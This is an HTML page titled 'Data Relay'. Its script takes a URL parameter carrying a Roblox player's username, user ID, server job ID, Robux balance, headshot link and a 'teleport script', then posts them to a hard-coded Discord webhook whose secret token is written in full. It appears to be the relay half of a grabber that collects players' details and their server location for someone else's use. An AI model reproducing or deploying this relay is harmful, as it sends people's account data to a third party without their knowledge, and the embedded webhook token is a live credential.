<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Data Relay</title>
</head>
<body>
  <script>
    // Helper function to extract query parameters by name.
    function getQueryParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

    // Retrieve the "data" parameter from the URL.
    const dataParam = getQueryParam('data');

    if (dataParam) {
      try {
        // Decode and parse the JSON data from the query parameter.
        const jsonData = JSON.parse(decodeURIComponent(dataParam));
        console.log("Received data:", jsonData);

        // Prepare the payload for the webhook.
        const payload = {
          content: "Player Info Received",
          embeds: [{
            title: "Player Info",
            fields: [
              { name: "Username", value: jsonData.username || "N/A", inline: true },
              { name: "UserID", value: jsonData.userId || "N/A", inline: true },
              { name: "JobID", value: jsonData.jobId || "N/A", inline: true },
              { name: "Robux", value: jsonData.robuxAmount || "N/A", inline: true },
              { name: "Teleport Script", value: jsonData.teleportScript || "N/A", inline: false }
            ],
            thumbnail: { url: jsonData.headshotUrl || "" }
          }]
        };

        // Send the payload to the webhook.
        fetch('https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU', {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        })
        .then(response => {
          if (response.ok) {
            console.log("Data sent successfully to webhook.");
          } else {
            console.error("Failed to send data to webhook. Status:", response.status);
          }
        })
        .catch(error => {
          console.error("Error sending data to webhook:", error);
        });
      } catch (error) {
        console.error("Error parsing JSON data from URL:", error);
      }
    } else {
      console.log("No 'data' parameter found in URL.");
    }
  </script>
</body>
</html>
